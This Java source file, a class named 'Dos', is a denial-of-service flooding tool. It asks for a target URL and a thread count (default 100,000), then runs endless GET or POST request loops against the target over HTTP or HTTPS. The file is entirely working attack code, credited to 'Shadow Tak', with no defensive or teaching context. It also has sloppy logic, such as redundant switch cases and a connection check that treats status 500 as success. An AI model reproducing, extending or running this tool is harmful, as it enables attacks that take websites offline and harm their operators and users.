import java.io.*;
import java.net.*;
import java.util.Scanner;
import java.util.ArrayList;

import javax.net.ssl.HttpsURLConnection;


public class Dos implements Runnable {



    private final String USER_AGENT =   "Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36";

    private static int amount = 0;
    private static String url = "";
    int seq;
    int type;

    public Dos(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }

    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 1:
                        postAttack(Dos.url);
                        break;
                    case 2:
                        sslPostAttack(Dos.url);
                        break;
                    case 3:
                        getAttack(Dos.url);
                        break;
                    case 4:
                        sslGetAttack(Dos.url);
                        break;
                    case 5:
                        postAttack(Dos.url);
                        break;
                    case 6:
                        sslPostAttack(Dos.url);
                        break;
                    case 7:
                        getAttack(Dos.url);
                        break;
                    case 8:
                        sslGetAttack(Dos.url);
                        break;
                    case 9:
                        postAttack(Dos.url);
                        break;
                    case 10:
                        sslPostAttack(Dos.url);
                        break;
                    case 11:
                        getAttack(Dos.url);
                        break;
                    case 12:
                        sslGetAttack(Dos.url);
                        break;
                    case 13:
                        postAttack(Dos.url);
                        break;
                    case 14:
                        sslPostAttack(Dos.url);
                        break;
                    case 15:
                        getAttack(Dos.url);
                        break;
                    case 16:
                        sslGetAttack(Dos.url);
                        break;
                    case 17:
                        postAttack(Dos.url);
                        break;
                    case 18:
                        sslPostAttack(Dos.url);
                        break;
                    case 19:
                        getAttack(Dos.url);
                        break;
                    case 20:
                        sslGetAttack(Dos.url);
                        break;
                    case 21:
                        postAttack(Dos.url);
                        break;
                    case 22:
                        sslPostAttack(Dos.url);
                        break;
                    case 23:
                        getAttack(Dos.url);
                        break;
                    case 24:
                        sslGetAttack(Dos.url);
                        break;
                    case 25:
                        postAttack(Dos.url);
                        break;
                    case 26:
                        sslPostAttack(Dos.url);
                        break;
                    case 27:
                        getAttack(Dos.url);
                        break;
                    case 28:
                        sslGetAttack(Dos.url);
                        break;
                    case 29:
                        postAttack(Dos.url);
                        break;
                    case 30:
                        sslPostAttack(Dos.url);
                        break;
                    case 31:
                        getAttack(Dos.url);
                        break;
                    case 32:
                        sslGetAttack(Dos.url);
                        break;
                    case 33:
                        postAttack(Dos.url);
                        break;
                    case 34:
                        sslPostAttack(Dos.url);
                        break;
                    case 35:
                        getAttack(Dos.url);
                        break;
                    case 36:
                        sslGetAttack(Dos.url);
                        break;
                    case 37:
                        postAttack(Dos.url);
                        break;
                    case 38:
                        sslPostAttack(Dos.url);
                        break;
                    case 39:
                        getAttack(Dos.url);
                        break;
                    case 40:
                        sslGetAttack(Dos.url);
                        break;
                    case 41:
                        postAttack(Dos.url);
                        break;
                    case 42:
                        sslPostAttack(Dos.url);
                        break;
                    case 43:
                        getAttack(Dos.url);
                        break;
                    case 44:
                        sslGetAttack(Dos.url);
                        break;

                }
            }
        } catch (Exception e) {

        }
    }


    public static void main(String[] args) throws Exception {
        String url = "";
        int attakingAmoun = 0;
        Dos dos = new Dos(0, 0);
        Scanner in = new Scanner(System.in);
        System.out.print("Enter Url: ");
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Starting Attack to url: " + url);

        String[] SUrl = url.split("://");

        System.out.println("Checking connection to Site");
        if (SUrl[0] == "http" || SUrl[0].equals("http")) {
            dos.checkConnection(url);
        } else {
            dos.sslCheckConnection(url);
        }

        System.out.println("Setting DDoS By: Shadow Tak");

        System.out.print("Thread: ");
        String amount = in.nextLine();

        if (amount == null || amount.equals(null) || amount.equals("")) {
            Dos.amount = 100000;
        } else {
            Dos.amount = Integer.parseInt(amount);
        }

        System.out.print("method: ");
        String option = in.nextLine();
        int ioption = 1;
        if (option == "get" || option == "GET") {
            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                ioption = 3;
            } else {
                ioption = 4;
            }
        } else {
            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                ioption = 1;
            } else {
                ioption = 2;
            }
        }

        Thread.sleep(2000);


        System.out.println("Starting Attack");
        ArrayList<Thread> threads = new ArrayList<Thread>();
        for (int i = 0; i < Dos.amount; i++) {
            Thread t = new Thread(new Dos(i, ioption));
            t.start();
            threads.add(t);
        }

        for (int i = 0; i < threads.size(); i++) {
            Thread t = threads.get(i);
            try {
                t.join();
            } catch (Exception e) {

            }
        }
        System.out.println("Main Thread ended");
    }

    private void checkConnection(String url) throws Exception {
        System.out.println("Checking Connection");
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        if (responseCode == 500) {
            System.out.println("Connected to website");
        }
        Dos.url = url;
    }

    private void sslCheckConnection(String url) throws Exception {
        System.out.println("Checking Connection (ssl)");
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        if (responseCode == 500) {
            System.out.println("Connected to website");
        }
        Dos.url = url;
    }

    private void postAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("POST attack done!: " + responseCode + "Thread: " + this.seq);
    }

    private void getAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
    }

    private void sslPostAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("GET attack done!:" + responseCode + "Thread: " + this.seq);
    }

    private void sslGetAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
    }
}
